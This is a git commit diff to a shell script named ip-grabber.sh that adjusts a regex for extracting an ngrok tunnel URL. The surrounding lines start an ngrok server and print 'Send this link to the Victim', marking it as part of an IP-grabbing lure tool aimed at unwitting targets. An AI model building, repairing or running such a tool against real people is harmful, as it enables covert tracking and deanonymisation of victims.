727e4d6774e0693879bfd569bc1525c6db673dc4
Himan10 <h3c.initiative46@gmail.com>
2023-06-25 01:03:29 +0530

    small change in the regex pattern

--- ip-grabber.sh
+++ ip-grabber.sh
@@ -247,7 +247,7 @@ printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
 ./ngrok http 3333 > /dev/null 2>&1 &
 sleep 10
 
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Po "https://[\w\-\.]+")
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Po 'https:\/\/.+?ngrok[^",]+')
 printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" $link
 checkfound
 }
